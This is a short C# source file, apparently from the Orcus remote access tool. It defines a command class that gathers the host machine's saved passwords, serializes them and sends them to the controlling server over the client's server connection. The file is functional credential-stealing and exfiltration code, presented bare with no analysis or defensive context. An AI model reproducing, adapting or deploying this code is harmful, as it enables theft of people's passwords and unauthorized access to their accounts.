using Orcus.Commands.Passwords;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Commands.Password;
using Orcus.Shared.Connection;
using Orcus.Shared.NetSerializer;
using Orcus.StaticCommands.Client;

namespace Orcus.StaticCommands
{
    public class PasswordRecoveryCommandEx : PasswordRecoveryCommand
    {
        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory,
            IClientInfo clientInfo)
        {
            var passwordData = PasswordsCommand.GetPasswords(true);
            var data = new Serializer(typeof (PasswordData)).Serialize(passwordData);
            clientInfo.ServerConnection.SendServerPackage(ServerPackageType.AddPasswords, data, false, 0);
        }
    }
}